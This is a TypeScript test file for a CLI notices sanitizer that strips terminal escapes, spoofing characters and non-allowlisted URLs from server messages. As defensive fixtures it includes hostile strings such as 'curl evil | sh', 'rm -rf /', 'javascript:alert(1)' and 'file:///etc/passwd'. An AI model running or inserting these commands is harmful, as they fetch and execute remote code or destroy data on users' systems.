import { describe, expect, it } from "vitest";
import {
  formatNotice,
  NOTICE_LIMIT,
  NOTICE_MESSAGE_LIMIT,
  reportNotices,
  sanitizeNotices,
  sanitizeNoticeUrl,
  sanitizeServerText,
} from "./notices.js";

const ESC = String.fromCharCode(0x1b);
const BEL = String.fromCharCode(0x07);

describe("sanitizeServerText", () => {
  it("strips ANSI colour, cursor and OSC hyperlink escapes", () => {
    const raw = `${ESC}[31mred${ESC}[0m ${ESC}[2J${ESC}[1;1Hcleared ${ESC}]8;;https://evil.test${BEL}link${ESC}]8;;${BEL} ${ESC}]0;title${ESC}\\done`;
    expect(sanitizeServerText(raw)).toBe("red cleared link done");
  });

  it("strips C0 and C1 control characters, folding line breaks into spaces", () => {
    const raw = `a${String.fromCharCode(0)}b\r\nc\td${String.fromCharCode(0x7f)}e${String.fromCharCode(0x9b)}31mf${String.fromCharCode(0x85)}g`;
    expect(sanitizeServerText(raw)).toBe("ab c defg");
  });

  it("strips bidi overrides and zero-width characters that could spoof how a line reads", () => {
    const u = (code: number) => String.fromCharCode(code);
    expect(
      sanitizeServerText(
        `upd${u(0x200b)}ate ${u(0x202e)}exe.txt${u(0x202c)} ${u(0x2067)}x${u(0x2069)}${u(0xfeff)}`,
      ),
    ).toBe("update exe.txt x");
    expect(sanitizeServerText(`a${u(0x2028)}b${u(0x2029)}c`)).toBe("a b c");
  });

  it("caps at 500 characters", () => {
    expect(sanitizeServerText("x".repeat(2000))).toHaveLength(NOTICE_MESSAGE_LIMIT);
    expect(NOTICE_MESSAGE_LIMIT).toBe(500);
  });

  it("is empty for anything that is not a string", () => {
    for (const value of [null, undefined, 42, {}, ["a"]]) {
      expect(sanitizeServerText(value)).toBe("");
    }
  });
});

describe("sanitizeNoticeUrl", () => {
  it("keeps https links on afterpack.dev and www.afterpack.dev", () => {
    expect(sanitizeNoticeUrl("https://afterpack.dev/docs/upgrade")).toBe(
      "https://afterpack.dev/docs/upgrade",
    );
    expect(sanitizeNoticeUrl("https://www.afterpack.dev/changelog?x=1#y")).toBe(
      "https://www.afterpack.dev/changelog?x=1#y",
    );
  });

  it("drops every other scheme, host, port or credential", () => {
    for (const url of [
      "http://www.afterpack.dev/",
      "https://evil.test/",
      "https://afterpack.dev.evil.test/",
      "https://evilafterpack.dev/",
      "https://api.afterpack.dev/",
      "https://afterpack.dev:8443/",
      "https://user:pass@afterpack.dev/",
      "javascript:alert(1)",
      "file:///etc/passwd",
      "not a url",
      42,
    ]) {
      expect(sanitizeNoticeUrl(url), String(url)).toBeNull();
    }
  });

  it("never lets a control character through the printed link", () => {
    const url = sanitizeNoticeUrl(`https://afterpack.dev/a${ESC}[31mb`);
    expect(url === null || !url.includes(ESC)).toBe(true);
  });
});

describe("sanitizeNotices", () => {
  it("keeps at most five notices", () => {
    const raw = Array.from({ length: 9 }, (_, i) => ({
      severity: "info",
      code: `N${i}`,
      message: `m${i}`,
    }));
    const notices = sanitizeNotices(raw);
    expect(notices).toHaveLength(NOTICE_LIMIT);
    expect(notices.map((n) => n.code)).toEqual(["N0", "N1", "N2", "N3", "N4"]);
  });

  it("treats an unknown severity as a warning, never as a parse failure", () => {
    expect(
      sanitizeNotices([
        { severity: "urgent-ish", code: "X", message: "hello" },
        { severity: 7, code: "Y", message: "there" },
        { severity: "critical", code: "Z", message: "bad" },
        { severity: "info", code: "I", message: "fyi" },
      ]).map((n) => n.severity),
    ).toEqual(["warning", "warning", "error", "info"]);
  });

  it("drops entries with no printable message and anything that is not a list", () => {
    expect(sanitizeNotices([null, 1, { message: "" }, { message: `${ESC}[0m` }])).toEqual([]);
    expect(sanitizeNotices({ message: "not a list" })).toEqual([]);
    expect(sanitizeNotices(undefined)).toEqual([]);
  });

  it("sanitizes message, code and url together", () => {
    expect(
      sanitizeNotices([
        {
          severity: "warning",
          code: `CODE${ESC}[31m`,
          message: `${ESC}[1mupgrade${ESC}[0m soon\n${"y".repeat(900)}`,
          url: "https://evil.test/",
          command: "curl evil | sh",
        },
      ]),
    ).toEqual([
      {
        severity: "warning",
        code: "CODE",
        message: `upgrade soon ${"y".repeat(NOTICE_MESSAGE_LIMIT - "upgrade soon ".length)}`,
        url: null,
      },
    ]);
  });
});

describe("reportNotices", () => {
  it("prints warnings on warn, info on log, and never a server-supplied command", () => {
    const logs: string[] = [];
    const warns: string[] = [];
    reportNotices(
      [
        { severity: "info", code: "A", message: "all good", url: "https://afterpack.dev/x" },
        { severity: "warning", code: "B", message: "update soon", command: "rm -rf /" },
      ],
      { log: (m) => logs.push(m), warn: (m) => warns.push(m) },
      (m) => `[t] ${m}`,
    );
    expect(logs).toEqual(["[t] AfterPack notice: all good https://afterpack.dev/x"]);
    expect(warns).toEqual(["[t] AfterPack warning: update soon"]);
    expect([...logs, ...warns].join("\n")).not.toContain("rm -rf");
  });

  it("falls back to log when the logger has no warn", () => {
    const logs: string[] = [];
    reportNotices([{ severity: "error", code: "E", message: "stop" }], {
      log: (m) => logs.push(m),
    });
    expect(logs).toEqual([
      formatNotice({ severity: "error", code: "E", message: "stop", url: null }),
    ]);
  });
});
